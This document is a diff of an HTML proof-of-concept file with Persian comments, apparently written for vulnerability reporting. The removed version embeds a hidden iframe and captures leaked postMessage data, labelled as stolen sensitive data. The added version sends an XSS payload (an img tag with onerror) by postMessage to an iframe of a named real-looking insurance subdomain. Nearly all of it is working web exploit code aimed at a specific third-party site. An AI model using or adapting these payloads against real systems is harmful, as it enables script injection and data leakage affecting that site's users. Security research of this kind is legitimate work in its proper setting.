@@ -1,46 +1,11 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PoC - Information Leakage via PostMessage</title>
-</head>
-<body>
-    <h2>اثبات آسیب‌پذیری نشت اطلاعات - لطفا کنسول را چک کنید</h2>
-    <p>اگر پیام JSON در کنسول دریافت شد، نشت اطلاعات با موفقیت انجام شده است.</p>
-    
-    <iframe id="victimFrame" src="https://VULNERABLE-SITE.COM/path/to/vulnerable-page.html" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>
-
-    <script>
-        var victim = document.getElementById("victimFrame").contentWindow;
-
-        // شنود کننده برای دریافت هرگونه پیام ارسالی از iFrame
-        window.addEventListener("message", function(event) {
-            
-            console.log("--- پیام دریافتی (Captured Message) ---");
-            console.log("Origin فرستنده:", event.origin);
-            
-            try {
-                var stolenData = JSON.parse(event.data);
-                
-                // 💥 این قسمت داده‌های نشت شده (مانند eventID) را نمایش می‌دهد 💥
-                console.log("✅ داده‌های حساس نشت شده:", stolenData);
-                alert("Data Leak Success! Check Console for JSON Payload.");
-                
-            } catch (e) {
-                console.warn("Received non-JSON data or unexpected format.");
-            }
-        });
-
-        // ارسال پیام ماشه‌کش (Trigger) برای مجبور کردن iFrame به ارسال پاسخ
-        document.getElementById("victimFrame").onload = function() {
-            console.log("Target loaded, sending trigger...");
-            
-            // این Payload دقیقاً همان چیزی است که کد آسیب‌پذیر انتظار دارد
-            var triggerPayload = JSON.stringify({ action: "Initialized" });
-            
-            // پیام به iFrame ارسال می‌شود
-            victim.postMessage(triggerPayload, "*"); 
-            console.log("Trigger Payload sent.");
-        };
-    </script>
-</body>
-</html>
+<iframe src="https://casers-dv1.geico.com/" id="vuln-iframe" onload="exploit()"></iframe>
+<script>
+  function exploit() {
+    var iframe = document.getElementById('vuln-iframe');
+    var payload = JSON.stringify({
+      action: "Initialized",  // تقلید از action اصلی
+      malicious: '<img src=x onerror=alert("XSS via postMessage!")>'  // payload XSS
+    });
+    iframe.contentWindow.postMessage(payload, "*");
+  }
+</script>
